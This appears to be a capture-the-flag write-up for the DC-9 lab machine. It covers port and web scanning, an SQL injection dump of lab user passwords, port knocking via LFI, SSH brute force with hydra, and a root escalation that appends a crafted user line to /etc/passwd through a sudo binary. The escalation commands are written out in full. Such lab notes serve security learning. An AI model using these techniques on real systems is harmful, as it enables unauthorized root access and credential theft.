# DC: 9
### Users
```
chandlerb
joeyt
janitor
fredf
```
### Credentials
```
chandlerb:UrAG0D!
joeyt:Passw0rd
janitor:Ilovepeepee
fredf:B4-Tru3-001

Website:
admin:transorbital1
```
## Recon
### Nmap Scan
```
Nmap scan report for dc-9 (192.168.1.47)
Host is up (0.00074s latency).
Not shown: 65533 closed tcp ports (reset), 1 filtered tcp port (port-unreach)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp filtered  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 00:0C:29:0F:67:5D (VMware)
```
### Web Recon
* Server: Apache/2.4.38
* Technologies: PHP
#### Nikto
```
+ Target IP:          192.168.1.47
+ Target Hostname:    192.168.1.47
+ Target Port:        80
+ Start Time:         2025-01-18 12:38:26 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /includes/: Directory indexing found.
+ /includes/: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8102 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2025-01-18 12:38:42 (GMT1) (16 seconds)
```
#### FFUF
```
:: Method           : GET
 :: URL              : http://192.168.1.47/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

index.php               [Status: 200, Size: 917, Words: 43, Lines: 43, Duration: 1ms]
search.php              [Status: 200, Size: 1091, Words: 47, Lines: 50, Duration: 0ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.                       [Status: 200, Size: 917, Words: 43, Lines: 43, Duration: 1ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
results.php             [Status: 200, Size: 1056, Words: 43, Lines: 55, Duration: 2ms]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
manage.php              [Status: 200, Size: 1210, Words: 43, Lines: 51, Duration: 2ms]
display.php             [Status: 200, Size: 2961, Words: 199, Lines: 42, Duration: 2ms]
welcome.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2ms]
.htm                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
session.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
.htpasswds              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htgroup                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
wp-forum.phps           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.bak           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htuser                 [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.ht                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htc                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
```
#### SQL Injection dump
Search functionality was vulnerable to a SQL injection attack and could be used to dump the database contents.
```
Database: users
Table: UserDetails
[17 entries]
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+

Database: Staff
Table: Users
[1 entry]
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+
```
## Foothold / Privilege Escalation
The SSH port was filtered meaning some type of firewall is blocking it or it’s temporarily closed. Since I had an LFI vulnerability present I decided to check for port knocking configuration files under /etc/knockd.conf and I found the correct sequence to open the SSH port.

Using hydra and dumped credentials from the SQL injection vulnerability I started a brute force attack and gained credentials for users chandlerb, joeyt and janitor.
```
[22][ssh] host: 192.168.1.47   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.1.47   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.1.47   login: janitor   password: Ilovepeepee
[22][ssh] host: 192.168.1.47   login: fredf   password: B4-Tru3-001
```
User janitor had a secret folder which contained collected passwords (malicious actor). And using hydra I found password for user fredf.

### Privilege Escalation
User fredf had a sudo permission to run a binary called test which executed test.py file. The python file was used for reading from a file and appending the read file to specified file. So since I could execute this action with root permissions I decided to append a new root level user to the system.
```
openssl passwd -1 -salt pwn password ==> $1$pwn$WLUErc1Owm1jbSwGklCpz1
```
```
Add to a pwn.txt file:
pwned:$1$pwn$WLUErc1Owm1jbSwGklCpz1:0:0:root:/bin/bash
```
```
sudo /opt/devstuff/test/test pwn.txt /etc/passwd
The last command appends our "pwned" root level user to the system and I can login
and pwn the system
```
## Notes
* If a port is filtered it sometimes means that a port knock needs to be performed so the port opens up
* This configuration is usually under **/etc/knockd.conf**